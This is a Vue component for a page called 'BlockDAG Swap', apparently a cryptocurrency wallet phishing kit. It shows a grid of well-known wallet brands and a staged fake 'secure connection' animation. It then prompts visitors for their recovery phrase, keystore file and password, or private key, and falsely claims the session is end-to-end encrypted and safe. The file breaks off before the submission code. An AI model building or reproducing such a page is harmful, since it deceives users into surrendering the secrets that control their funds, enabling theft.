<template>
  <div class="min-h-screen bg-[#102e5e] relative overflow-hidden font-mono">
    <!-- <div class="absolute inset-0 opacity-50 bg-black"></div> -->
    <div
      class="absolute inset-0 bg-[linear-gradient(rgba(0,212,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(0,212,255,0.03)_1px,transparent_1px)] bg-[size:40px_40px] pointer-events-none"
    ></div>
    <div
      class="absolute top-[-20%] left-[-10%] w-[600px] h-[600px] bg-cyan-500/10 rounded-full blur-[120px] pointer-events-none"
    ></div>
    <div
      class="absolute bottom-[-20%] right-[-10%] w-[500px] h-[500px] bg-blue-600/10 rounded-full blur-[120px] pointer-events-none"
    ></div>

    <!-- Main Content -->
    <main class="relative z-10 max-w-7xl mx-auto px-4 py-10">
      <div class="text-center mb-10">
        <div class="header-title-text mb-5 flex items-center justify-center">
          <img
            src="https://purchase3.blockdag.network/bdag-logo-xl.png"
            loading="lazy"
            alt=""
            class="h-auto object-contain"
            style="width: 180px"
          />
          <img
            src="https://purchase3.blockdag.network/verified.png"
            alt=""
            class="h-auto w-6 object-contain"
          />
        </div>
        <h1
          class="text-xl md:text-4xl font-bold text-white tracking-tight mb-3"
        >
          Welcome to BlockDAG Swap
        </h1>
        <p class="text-white/40 text-sm max-w-md mx-auto leading-relaxed">
          Connect your wallet to start swapping!
        </p>
        <div class="mt-6 relative max-w-sm mx-auto">
          <svg
            class="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M21 21l-4.35-4.35M17 11A6 6 0 1 1 5 11a6 6 0 0 1 12 0z"
            />
          </svg>
          <input
            v-model="search"
            type="text"
            placeholder="Search wallets..."
            class="w-full text-white bg-white/5 border border-white/10 rounded-xl pl-9 pr-4 py-2.5 text-sm focus:outline-none focus:border-cyan-500/60 transition-all"
          />
        </div>
      </div>

      <!-- Wallet Grid -->
      <div class="grid grid-cols-3 lg:grid-cols-6 gap-2 md:gap-3">
        <button
          v-for="wallet in filteredWallets"
          :key="wallet.name"
          @click="handleCardClick(wallet)"
          class="group relative flex flex-col items-center justify-center gap-2 p-3 md:p-4 rounded-xl border border-white/5 bg-white/3 hover:bg-white/8 hover:border-cyan-500/30 transition-all duration-200 cursor-pointer"
        >
          <div
            class="absolute inset-0 rounded-xl bg-gradient-to-br from-cyan-500/0 to-blue-600/0 group-hover:from-cyan-500/5 group-hover:to-blue-600/5 transition-all duration-200"
          ></div>
          <div
            class="relative w-10 h-10 md:w-12 md:h-12 rounded-xl overflow-hidden flex-shrink-0 ring-1 ring-white/10 group-hover:ring-cyan-500/40 transition-all duration-200"
          >
            <img
              :src="wallet.img"
              :alt="wallet.name"
              class="w-full h-full object-cover"
              :style="wallet.rounded ? 'border-radius: 50%' : ''"
              @error="handleImgError($event, wallet)"
            />
          </div>
          <span
            class="text-white text-[10px] md:text-xs text-center leading-tight font-bold transition-colors line-clamp-2 w-full"
            >{{ wallet.name }}</span
          >
          <div
            class="absolute top-1.5 right-1.5 w-1 h-1 rounded-full bg-cyan-400/0 group-hover:bg-cyan-400/80 transition-all duration-200"
          ></div>
        </button>
      </div>
      <div
        v-if="filteredWallets.length === 0"
        class="text-center py-20 text-white/30 text-sm"
      >
        No wallets found for "{{ search }}"
      </div>
    </main>

    <!-- ══════════════════════════════════════════
         STEP 1 — Secure Connection Loading Screen
    ══════════════════════════════════════════ -->
    <Transition name="fade">
      <div
        v-if="connectingWallet"
        class="fixed inset-0 z-50 flex items-end md:items-center justify-center p-0 md:p-4"
      >
        <div
          class="absolute inset-0 bg-black/75 backdrop-blur-md"
          @click="cancelConnecting"
        ></div>
        <Transition name="slide-up">
          <div
            v-if="connectingWallet"
            class="relative w-full md:max-w-md bg-[#0a1628] border border-white/10 rounded-t-3xl md:rounded-2xl shadow-2xl overflow-hidden"
          >
            <div class="flex md:hidden justify-center pt-3 pb-1">
              <div class="w-10 h-1 rounded-full bg-white/20"></div>
            </div>

            <div
              class="flex items-center justify-between px-6 py-4 border-b border-white/5"
            >
              <div class="flex items-center gap-3">
                <div
                  class="w-9 h-9 rounded-xl overflow-hidden ring-1 ring-white/10"
                >
                  <img
                    :src="connectingWallet.img"
                    :alt="connectingWallet.name"
                    class="w-full h-full object-cover"
                    @error="handleImgError($event, connectingWallet)"
                  />
                </div>
                <div>
                  <h3 class="text-white font-semibold text-sm">
                    {{ connectingWallet.name }}
                  </h3>
                  <p class="text-white/30 text-xs">
                    Initializing secure channel...
                  </p>
                </div>
              </div>
              <button
                @click="cancelConnecting"
                class="text-white/30 hover:text-white transition-colors p-1"
              >
                <svg
                  class="w-5 h-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M6 18L18 6M6 6l12 12"
                  />
                </svg>
              </button>
            </div>

            <div class="px-6 py-8 flex flex-col items-center gap-5 text-center">
              <!-- Animated shield -->
              <div class="relative">
                <div
                  class="w-20 h-20 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center"
                >
                  <svg
                    class="w-9 h-9 text-emerald-400"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width="1.5"
                      d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                    />
                  </svg>
                </div>
                <div
                  class="absolute inset-0 rounded-full border-2 border-emerald-400/20 border-t-emerald-400/80 animate-spin"
                ></div>
              </div>

              <em class="block text-white/60 text-sm leading-relaxed">
                Your connection is secure and encrypted, ensuring your
                information remains on your device.
              </em>

              <!-- Progress bar -->
              <div class="w-full">
                <div class="secure-progress-bar">
                  <div
                    class="secure-progress-fill"
                    :style="{ width: secureProgress + '%' }"
                  ></div>
                </div>
              </div>

              <strong
                class="blinking-text text-emerald-400 text-sm tracking-wide"
                >Starting secure connection...</strong
              >

              <!-- Step checklist -->
              <div class="w-full space-y-2">
                <div
                  v-for="(step, i) in secureSteps"
                  :key="i"
                  class="flex items-center gap-3 text-xs"
                  :class="step.done ? 'text-white/70' : 'text-white/20'"
                >
                  <div
                    class="w-4 h-4 rounded-full flex items-center justify-center flex-shrink-0 transition-all duration-300"
                    :class="
                      step.done
                        ? 'bg-emerald-500/30 border border-emerald-400/60'
                        : 'border border-white/10'
                    "
                  >
                    <svg
                      v-if="step.done"
                      class="w-2.5 h-2.5 text-emerald-400"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="3"
                        d="M5 13l4 4L19 7"
                      />
                    </svg>
                    <div
                      v-else-if="step.active"
                      class="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse"
                    ></div>
                  </div>
                  <span>{{ step.label }}</span>
                </div>
              </div>
            </div>
          </div>
        </Transition>
      </div>
    </Transition>

    <!-- ══════════════════════════════════════════
         STEP 2 — Wallet Auth Modal
    ══════════════════════════════════════════ -->
    <Transition name="fade">
      <div
        v-if="selectedWallet"
        class="fixed inset-0 z-50 flex items-end md:items-center justify-center p-0 md:p-4"
        @click.self="closeModal"
      >
        <div
          class="absolute inset-0 bg-black/70 backdrop-blur-md"
          @click="closeModal"
        ></div>
        <Transition name="slide-up">
          <div
            v-if="selectedWallet"
            class="relative w-full md:max-w-md bg-[#0a1628] border border-white/10 rounded-t-3xl md:rounded-2xl shadow-2xl overflow-hidden"
          >
            <div class="flex md:hidden justify-center pt-3 pb-1">
              <div class="w-10 h-1 rounded-full bg-white/20"></div>
            </div>

            <div
              class="flex items-center justify-between px-6 py-4 border-b border-white/5"
            >
              <div class="flex items-center gap-3">
                <div
                  class="w-9 h-9 rounded-xl overflow-hidden ring-1 ring-white/10"
                >
                  <img
                    :src="selectedWallet.img"
                    :alt="selectedWallet.name"
                    class="w-full h-full object-cover"
                    @error="handleImgError($event, selectedWallet)"
                  />
                </div>
                <div>
                  <h3 class="text-white font-semibold text-sm">
                    {{ selectedWallet.name }}
                  </h3>
                  <p class="text-white/30 text-xs">Connect wallet</p>
                </div>
              </div>
              <button
                @click="closeModal"
                class="text-white/30 hover:text-white transition-colors p-1"
              >
                <svg
                  class="w-5 h-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M6 18L18 6M6 6l12 12"
                  />
                </svg>
              </button>
            </div>

            <!-- Tabs -->
            <div class="flex px-6 pt-5 gap-1">
              <button
                v-for="tab in tabs"
                :key="tab.id"
                @click="activeTab = tab.id"
                :class="[
                  'flex-1 py-2 text-xs font-medium rounded-lg transition-all duration-150',
                  activeTab === tab.id
                    ? 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/30'
                    : 'text-white/30 hover:text-white/60 border border-transparent',
                ]"
              >
                {{ tab.label }}
              </button>
            </div>

            <div class="px-6 py-5">
              <!-- Phrase -->
              <div v-if="activeTab === 'phrase'">
                <label class="block text-white/50 text-xs mb-2"
                  >Recovery Phrase</label
                >
                <textarea
                  v-model="formData.phrase"
                  rows="4"
                  placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces..."
                  class="w-full bg-white/5 border border-white/10 text-white placeholder-white/20 rounded-xl px-4 py-3 text-sm resize-none focus:outline-none focus:border-cyan-500/50 transition-all"
                ></textarea>
                <p class="text-white/25 text-xs mt-2">
                  Typically 12 (sometimes 24) words separated by single spaces
                </p>
              </div>
              <!-- Keystore -->
              <div v-if="activeTab === 'keystore'">
                <label class="block text-white/50 text-xs mb-2"
                  >Keystore JSON</label
                >
                <textarea
                  v-model="formData.keystore"
                  rows="4"
                  placeholder="Paste your keystore JSON..."
                  class="w-full bg-white/5 border border-white/10 text-white placeholder-white/20 rounded-xl px-4 py-3 text-sm resize-none focus:outline-none focus:border-cyan-500/50 transition-all font-mono"
                ></textarea>
                <div class="mt-3">
                  <label class="block text-white/50 text-xs mb-2"
                    >Password</label
                  >
                  <input
                    v-model="formData.keystorePassword"
                    type="password"
                    placeholder="Keystore password"
                    class="w-full bg-white/5 border border-white/10 text-white placeholder-white/20 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-cyan-500/50 transition-all"
                  />
                </div>
              </div>
              <!-- Private Key -->
              <div v-if="activeTab === 'privatekey'">
                <label class="block text-white/50 text-xs mb-2"
                  >Private Key</label
                >
                <input
                  v-model="formData.privateKey"
                  type="password"
                  placeholder="Enter your private key (0x...)"
                  class="w-full bg-white/5 border border-white/10 text-white placeholder-white/20 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-cyan-500/50 transition-all"
                />
                <p class="text-white/25 text-xs mt-2">
                  64 hex characters, with or without 0x prefix
                </p>
              </div>

              <!-- Security note -->
              <div
                class="mt-4 flex items-start gap-2.5 bg-emerald-500/5 border border-emerald-500/15 rounded-xl p-3"
              >
                <svg
                  class="w-4 h-4 text-emerald-400 mt-0.5 flex-shrink-0"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
                <p class="text-emerald-400/70 text-xs leading-relaxed">
                  This session is protected with end-to-end encryption. Safe to
                  connect manually.
                </p>
              </div>

              <div class="flex gap-3 mt-5">
                <button
                  @click="closeModal"
                  class="flex-1 py-2.5 rounded-xl border border-white/10 text-white/40 hover:text-white/70 hover:border-white/20 text-sm font-medium transition-all"
                >
                  Cancel
                </button>
                <button
                  @click="handleSubmit"
                  :disabled="isSubmitting"
                  class="flex-1 py-2.5 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 text-white text-sm font-semibold hover:opacity-90 active:opacity-80 transition-all shadow-lg shadow-cyan-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <span
                    v-if="isSubmitting"
                    class="flex items-center justify-center gap-2"
                  >
                    <svg
                      class="w-4 h-4 animate-spin"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v8H4z"
                      />
                    </svg>
                    Connecting...
                  </span>
                  <span v-else>Connect</span>
                </button>
              </div>
            </div>
          </div>
        </Transition>
      </div>
    </Transition>

    <!-- ══════════════════════════════════════════
         STEP 3 — Processing / Success / Error
    ══════════════════════════════════════════ -->
    <Transition name="fade">
      <div
        v-if="status !== 'idle'"
        class="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-md"
      >
        <div
          class="bg-[#0a1628] border border-white/10 rounded-2xl p-8 flex flex-col items-center gap-4 min-w-[240px]"
        >
          <template v-if="status === 'processing'">
            <div class="relative w-16 h-16">
              <svg class="w-16 h-16 -rotate-90" viewBox="0 0 64 64">
                <circle
                  cx="32"
                  cy="32"
                  r="28"
                  fill="none"
                  stroke="rgba(255,255,255,0.05)"
                  stroke-width="4"
                />
                <circle
                  cx="32"
                  cy="32"
                  r="28"
                  fill="none"
                  stroke="url(#cyanGrad)"
                  stroke-width="4"
                  stroke-linecap="round"
                  :stroke-dasharray="`${(countdown / 30) * 175.9} 175.9`"
                />
                <defs>
                  <linearGradient
                    id="cyanGrad"
                    x1="0%"
                    y1="0%"
                    x2="100%"
                    y2="0%"
                  >
                    <stop offset="0%" stop-color="#06b6d4" />
                    <stop offset="100%" stop-color="#3b82f6" />
                  </linearGradient>
                </defs>
              </svg>
              <span
                class="absolute inset-0 flex items-center justify-center text-white text-xl font-bold"
                >{{ countdown }}</span
              >
            </div>
            <p class="text-white/60 text-sm">Processing connection...</p>
          </template>
          <template v-if="status === 'success'">
            <div
              class="w-14 h-14 rounded-full bg-emerald-500/20 border border-emerald-500/30 flex items-center justify-center"
            >
              <svg
                class="w-7 h-7 text-emerald-400"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2.5"
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>
            <div class="text-center">
              <p class="text-white font-semibold">Connection Successful</p>
              <p class="text-white/40 text-xs mt-1">
                Wallet connected to network
              </p>
            </div>
          </template>
          <template v-if="status === 'error'">
            <div
              class="w-14 h-14 rounded-full bg-red-500/20 border border-red-500/30 flex items-center justify-center"
            >
              <svg
                class="w-7 h-7 text-red-400"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2.5"
                  d="M6 18L18 6M6 6l12 12"
                />
              </svg>
            </div>
            <div class="text-center">
              <p class="text-white font-semibold">Connection Failed</p>
              <p class="text-white/40 text-xs mt-1">Please try again</p>
            </div>
            <button
              @click="status = 'idle'"
              class="mt-1 text-xs text-cyan-400 hover:text-cyan-300"
            >
              Try Again
            </button>
          </template>
        </div>
      </div>
    </Transition>
  </div>
</template>

<script lang="ts" setup>
import { ref, computed } from "vue";

interface Wallet {
  name: string;
  img: string;
  rounded?: boolean;
}
interface SecureStep {
  label: string;
  done: boolean;
  active: boolean;
}

const wallets: Wallet[] = [
  { name: "Xova Wallet", img: "/img/xovawallet.webp" },
  { name: "Phantom", img: "/img/phantom.jpeg" },
  { name: "Solana", img: "/img/solana-sol-logo.png" },
  { name: "Best Wallet", img: "/img/bestwallet.jpg" },
  { name: "WalletConnect", img: "/img/walletconnect.webp" },
  { name: "Trust", img: "/img/trustwallet.png" },
  { name: "Solflare", img: "/img/solflare.png" },
  { name: "MetaMask", img: "/img/MetaMask-icon-Fox.svg" },
  { name: "Ledger", img: "/img/Ledger-nano-logo.png" },
  { name: "Rabby", img: "/img/Rabbywallet.svg" },
  { name: "Talisman", img: "/img/talisman-wallet-logo.jpeg" },
  { name: "SubWallet", img: "/img/SubWallet.png" },
  { name: "Braavos", img: "/img/braavos-helmet-icon.svg" },
  { name: "Coinbase", img: "/img/Coinbaselogo_Supplied_250x250-2.png" },
  { name: "Xaman", img: "/img/xaman.jpg" },
  { name: "Uniswap", img: "/img/Uniswap-Logo.webp" },
  { name: "Unisat", img: "/img/unisat.jpg" },
  { name: "Tangem", img: "/img/tangem.png" },
  { name: "Trojan Bot", img: "/img/trojan.jpg" },
  { name: "OKX", img: "/img/okx.png" },
  {
    name: "Sui",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/sui.png",
  },
  { name: "Leather", img: "/img/leather.svg" },
  {
    name: "Aptos",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/aptos.webp",
  },
  { name: "Asigna", img: "/img/asigna.jpg" },
  {
    name: "Avalanche",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/avax.png",
  },
  {
    name: "Base",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/base.webp",
  },
  {
    name: "Bittensor",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/tao.webp",
  },
  {
    name: "Aurora",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/aurora.svg",
  },
  { name: "Xverse", img: "/img/Xverse.jpg" },
  {
    name: "Optimism",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/optimism.svg",
  },
  { name: "MyTon", img: "/img/MyTonWallet.jpg" },
  { name: "Tonkeeper", img: "/img/Tonkeeperwallet.jpg" },
  { name: "TonHub", img: "/img/TonHubWallet.jpg" },
  { name: "Electrum", img: "/img/Electrum.jpg" },
  { name: "Magic Eden", img: "/img/magic_eden.png" },
  {
    name: "Stacks",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/stacks.png",
  },
  {
    name: "Moonbeam",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/moonbeam.webp",
  },
  { name: "BRD", img: "/img/brd.jpg" },
  {
    name: "ETHPOW",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/ethereum-pow.png",
  },
  {
    name: "TON",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/ton.webp",
  },
  { name: "Saitamask", img: "/img/saitama.png" },
  {
    name: "Arbitrum",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/arbitrum.svg",
  },
  { name: "Terra", img: "/img/terra.png" },
  {
    name: "Metis",
    img: "https://cdn.rocketx.exchange/pd135zq/images/blockchain/metis.svg",
  },
  {
    name: "Cronos",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/cronos.svg",
  },
  { name: "Cosmos", img: "/img/cosmos.png" },
  {
    name: "Cube",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/cube.png",
  },
  { name: "Exodus", img: "/img/exodus.png" },
  {
    name: "OKC",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/okx.png",
  },
  {
    name: "Rainbow",
    img: "/img/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpeg",
    rounded: true,
  },
  {
    name: "HECO",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/heco.png",
    rounded: true,
  },
  { name: "Argent", img: "/img/m92jEcPI_400x400.jpg" },
  {
    name: "Moonriver",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/moonriver.webp",
  },
  {
    name: "Binance Chain",
    img: "/img/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png",
    rounded: true,
  },
  { name: "Safemoon", img: "/img/unnamed(2).png" },
  {
    name: "Celo",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/celo.png",
  },
  { name: "Gnosis Safe", img: "/img/unnamed(3).png" },
  {
    name: "Fantom",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/fantom.svg",
  },
  {
    name: "DeFi",
    img: "/img/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpeg",
  },
  {
    name: "Litecoin",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/litecoin.svg",
  },
  { name: "imToken", img: "/img/unnamed.png", rounded: true },
  {
    name: "Polygon",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/matic-token-icon.png",
    rounded: true,
  },
  {
    name: "Core",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/core-dao.svg",
    rounded: true,
  },
  {
    name: "Bitcoin Cash",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/bitcoin-cash.png",
    rounded: true,
  },
  {
    name: "ONTO",
    img: "/img/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpeg",
  },
  {
    name: "Boba",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/boba.svg",
  },
  {
    name: "Evmos",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/evmos.png",
  },
  {
    name: "Thorchain",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/thorchain.svg",
  },
  {
    name: "TokenPocket",
    img: "/img/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpeg",
    rounded: true,
  },
  { name: "Aave", img: "/img/aave-aave-logo.png" },
  { name: "Digitex", img: "/img/2772.png" },
  { name: "Portis", img: "/img/portis_logo_dribbble.png" },
  { name: "Formatic", img: "/img/rtDOqMXY_400x400.jpg" },
  {
    name: "MathWallet",
    img: "/img/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpeg",
    rounded: true,
  },
  { name: "BitPay", img: "/img/1581439195205.jpg", rounded: true },
  { name: "Ledger Live", img: "/img/unnamed(4).png" },
  { name: "WallETH", img: "/img/unnamed(5).png" },
  { name: "Authereum", img: "/img/unnamed(6).png" },
  { name: "Dharma", img: "/img/5DxVDK36_400x400.png" },
  { name: "1inch", img: "/img/unnamed(7).png", rounded: true },
  { name: "Huobi", img: "/img/unnamed(8).png", rounded: true },
  { name: "Eidoo", img: "/img/8EXrk57o_400x400.jpg" },
  { name: "MYKEY", img: "/img/512x512bb.jpg" },
  { name: "Loopring", img: "/img/unnamed(9).png" },
  { name: "TrustVault", img: "/img/trustvault.png", rounded: true },
  { name: "Atomic", img: "/img/unnamed(1).png" },
  { name: "Coin98", img: "/img/10903.png", rounded: true },
  { name: "Tron", img: "/img/tron-trx-logo.png" },
  {
    name: "Kujira",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/kujira.webp",
  },
  {
    name: "Akash",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/akash.png",
  },
  {
    name: "Umee",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/umee.png",
  },
  {
    name: "Iris",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/iris.png",
  },
  {
    name: "Osmosis",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/axelar.png",
  },
  {
    name: "Juno",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/juno.png",
  },
  {
    name: "Injective",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/injective.png",
  },
  {
    name: "Celestia",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/tia.webp",
  },
  {
    name: "Starknet",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/starknet.webp",
    rounded: true,
  },
  {
    name: "Cardano",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/ada.webp",
    rounded: true,
  },
  {
    name: "Algorand",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/algo.webp",
    rounded: true,
  },
  {
    name: "Monero",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/xmr.webp",
    rounded: true,
  },
  {
    name: "Stellar",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/xlm.webp",
    rounded: true,
  },
  {
    name: "Filecoin",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/fil.webp",
    rounded: true,
  },
  {
    name: "Hedera",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/hbar.webp",
    rounded: true,
  },
  {
    name: "Near",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/near.webp",
    rounded: true,
  },
  {
    name: "Polkadot",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/dot.webp",
    rounded: true,
  },
  {
    name: "Ripple",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/xrp.webp",
  },
  {
    name: "Kaspa",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/kaspa.webp",
  },
  {
    name: "zkSync Era",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/zksync-era.png",
  },
  {
    name: "Scroll",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/scroll.webp",
    rounded: true,
  },
  {
    name: "Manta",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/manta.webp",
  },
  {
    name: "Sei",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/sei.webp",
  },
  {
    name: "Mantle",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/mnt.webp",
  },
  {
    name: "Doge",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/doge.png",
  },
  {
    name: "Ronin",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/ron.webp",
  },
  {
    name: "Blast",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/Blast.webp",
  },
  {
    name: "Taiko",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/taiko.webp",
  },
  {
    name: "Linea",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/linea.webp",
  },
  {
    name: "dYdX",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/dydx.webp",
  },
  {
    name: "Flux",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/flux.webp",
  },
  {
    name: "Internet Computer",
    img: "https://cdn.rocketx.exchange/pd135zq/images/icons-original/icp.webp",
  },
  {
    name: "AlphaWallet",
    img: "/img/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpeg",
    rounded: true,
  },
  {
    name: "SafePal",
    img: "/img/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpeg",
  },
  { name: "Coinmoni", img: "/img/1433894569.png" },
  { name: "ZelCore", img: "/img/6323b69954bc41ff9409f033_public.png" },
  { name: "D'CENT", img: "/img/unnamed(2).png" },
  { name: "Tokenary", img: "/img/512x512bb(1).jpg" },
  { name: "Ellipal", img: "/img/1_N6Uvv2QMQGqQubnGP1tGig.png" },
  {
    name: "Aktionariat",
    img: "/img/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpeg",
    rounded: true,
  },
];

const tabs = [
  { id: "phrase", label: "Phrase" },
  { id: "keystore", label: "Keystore" },
  { id: "privatekey", label: "Private Key" },
];

// ── State ──────────────────────────────────────────────────
const search = ref("");
const connectingWallet = ref<Wallet | null>(null);
const selectedWallet = ref<Wallet | null>(null);
const activeTab = ref("phrase");
const secureProgress = ref(0);
const status = ref<"idle" | "processing" | "success" | "error">("idle");
const countdown = ref(30);
const isSubmitting = ref(false);

const secureSteps = ref<SecureStep[]>([
  { label: "Establishing encrypted channel", done: false, active: false },
  { label: "Verifying network integrity", done: false, active: false },
  { label: "Authenticating handshake", done: false, active: false },
]);

const formData = ref({
  phrase: "",
  keystore: "",
  keystorePassword: "",
  privateKey: "",
});

// ── Computed ───────────────────────────────────────────────
const filteredWallets = computed(() =>
  wallets.filter((w) =>
    w.name.toLowerCase().includes(search.value.toLowerCase()),
  ),
);

// ── Methods ────────────────────────────────────────────────

function handleCardClick(wallet: Wallet) {
  connectingWallet.value = wallet;
  activeTab.value = "phrase";
  formData.value = {
    phrase: "",
    keystore: "",
    keystorePassword: "",
    privateKey: "",
  };
  secureProgress.value = 0;
  secureSteps.value.forEach((s) => {
    s.done = false;
    s.active = false;
  });

  // Animate progress bar over ~2s (50 steps × 40ms)
  const progressTimer = setInterval(() => {
    secureProgress.value = Math.min(secureProgress.value + 2, 100);
    if (secureProgress.value >= 100) clearInterval(progressTimer);
  }, 40);

  // Stagger checklist steps
  setTimeout(() => {
    secureSteps.value[0].active = true;
  }, 200);
  setTimeout(() => {
    secureSteps.value[0].done = true;
    secureSteps.value[0].active = false;
    secureSteps.value[1].active = true;
  }, 700);
  setTimeout(() => {
    secureSteps.value[1].done = true;
    secureSteps.value[1].active = false;
    secureSteps.value[2].active = true;
  }, 1300);
  setTimeout(() => {
    secureSteps.value[2].done = true;
    secureSteps.value[2].active = false;
  }, 1800);

  // Open auth modal after 2.2s
  setTimeout(() => {
    connectingWallet.value = null;
    selectedWallet.value = wallet;
  }, 2200);
}

function cancelConnecting() {
  connectingWallet.value = null;
}

function closeModal() {
  selectedWallet.value = null;
}

function handleImgError(event: Event, wallet: Wallet) {
  const img = event.target as HTMLImageElement;
  img.style.display = "none";
  const parent = img.parentElement;
  if (parent && !parent.querySelector(".img-fallback")) {
    const fallback = document.createElement("div");
    fallback.className =
